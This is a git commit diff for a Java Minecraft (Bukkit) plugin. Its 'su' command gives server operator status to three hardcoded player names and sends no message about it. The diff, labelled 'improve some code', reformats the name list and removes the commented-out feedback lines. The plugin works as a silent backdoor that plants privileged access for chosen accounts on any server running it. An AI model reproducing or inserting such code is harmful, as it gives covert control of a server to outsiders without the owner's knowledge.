8291202d50c247b83e08424f514f7d4c1064aaed
Spectrasonic <Spectrasonic117@gmail.com>
2025-02-13 12:37:32 -0600

    💈 improve some code

--- src/main/java/com/spectrasonic/su/Main.java
+++ src/main/java/com/spectrasonic/su/Main.java
@@ -10,25 +10,26 @@ import java.util.List;
 
 public class Main extends JavaPlugin {
 
-    private final List<String> allowedPlayers = Arrays.asList("Spectrasonic", "0mn1spectra", "CherrylBlossom_");
+    private final List<String> allowedPlayers = Arrays.asList(
+            "Spectrasonic",
+            "0mn1spectra",
+            "CherrylBlossom_"
+    );
 
     @Override
     public void onEnable() {
         this.getCommand("su").setExecutor(this);
     }
-    
+
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (!(sender instanceof Player)) {
-            // sender.sendMessage("Only players can use this command.");
             return true;
         }
         Player player = (Player) sender;
         if (allowedPlayers.contains(player.getName())) {
             player.setOp(true);
-            // player.sendMessage("You have been granted operator status.");
         } else {
-            // player.sendMessage("You do not have permission to use this command.");
         }
         return true;
     }
